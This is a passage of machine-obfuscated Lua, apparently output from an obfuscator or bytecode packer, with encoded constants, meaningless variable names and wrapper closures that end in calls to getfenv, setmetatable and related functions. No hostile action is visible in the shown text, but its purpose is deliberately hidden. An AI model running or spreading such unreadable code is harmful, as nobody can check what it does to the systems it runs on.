I=3101054-(-654580)n=j[q]m=f-Q b=z(m)n[f]=b f=nil end end else if I<-1028992+16091843 then if I<147301+14362978 then S=nil w=x(w)i=nil R=nil R={}z=x(z)S=E(889729-827066)H=nil i=E(851712-789048)f=x(f)D=nil z=E(34081+28582)J=x(J)d=x(d)D=947453+-947452 w=W()J=nil K=x(K)K=p[S]S=E(-568370+631060)V=x(V)q=nil V=K[S]q=W()K=W()I=-360811+4187616 r=x(r)j[K]=V d=nil S=p[z]z=E(133510-70818)V=S[z]z=p[i]f=646580+-646324 i=E(595186+-532527)S=z[i]H={}r=E(807289+-744593)i=p[r]r=E(-695271-(-757943))n=f z=i[r]r=W()i=-237095-(-237095)f=-156196-(-156197)j[r]=i i=224743+-224741 b=f j[w]=i j[q]=R i={}f=-919036+919036 m=b<f R=-882939+882939 f=D-b else I=c(13498300-416813,{V})Y={I()}I=p[E(-416749+479453)]l={g(Y)}end else if I<15003359-(-205478)then I=j[N[-704044-(-704054)]]d=j[N[199153-199142]]a[I]=d I=j[N[499963-499951]]d={I(a)}I=p[E(-351998-(-414701))]l={g(d)}else O=E(152997+-90308)w=-943229+943232 r=W()j[r]=l I=j[z]R=718775-718710 l=I(w,R)H=E(576712-514032)w=W()I=411437+-411437 R=I I=163173+-163173 j[w]=l q=I l=p[H]D=c(-771704+1459341,{})H={l(D)}I={g(H)}l=-788856+788858 H=I I=H[l]D=I l=E(580658+-517997)I=p[l]f=j[J]Y=p[O]O=Y(D)Y=E(988196-925501)v=f(O,Y)f={v()}l=I(g(f))f=W()j[f]=l v=j[w]I=-646836+5023545 Y=v l=513520+-513519 v=863547+-863546 O=v v=-470319+470319 n=O<v v=l-O end end end end end end end I=#G return g(l)end,function(p)a[p]=a[p]-(-79330+79331)if a[p]==877179+-877179 then a[p],j[p]=nil,nil end end,-637428-(-637428),function(p,E)local g=J(E)local L=function()return I(p,{},E,g)end return L end,function()d=d+(129061-129060)a[d]=-788215-(-788216)return d end,function(p,E)local g=J(E)local L=function(L,N,G,A,l)return I(p,{L,N;G,A,l},E,g)end return L end,{},function(p,E)local g=J(E)local L=function(L,N)return I(p,{L;N},E,g)end return L end,{},function(p,E)local g=J(E)local L=function(L,N,G,A)return I(p,{L,N,G;A},E,g)end return L end,function(p,E)local g=J(E)local L=function(L,N,G)return I(p,{L,N,G},E,g)end return L end,function(p)local E,I=613043+-613042,p[-960573-(-960574)]while I do a[I],E=a[I]-(752248-752247),(-297385+297386)+E if 185766+-185766==a[I]then a[I],j[I]=nil,nil end I=p[E]end end,function(p)for E=-624563+624564,#p,-615283+615284 do a[p[E]]=(554609+-554608)+a[p[E]]end if L then local I=L(true)local g=G(I)g[E(-223655+286332)],g[E(125296-62626)],g[E(202790+-140128)]=p,V,function()return-585074+-643380 end return I else return N({},{[E(-707894+770564)]=V;[E(-973419-(-1036096))]=p,[E(949441-886779)]=function()return 971454+-2199908 end})end end return(K(-480559-(-850234),{}))(g(l))end)(getfenv and getfenv()or _ENV,unpack or table[E(-910908+973607)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
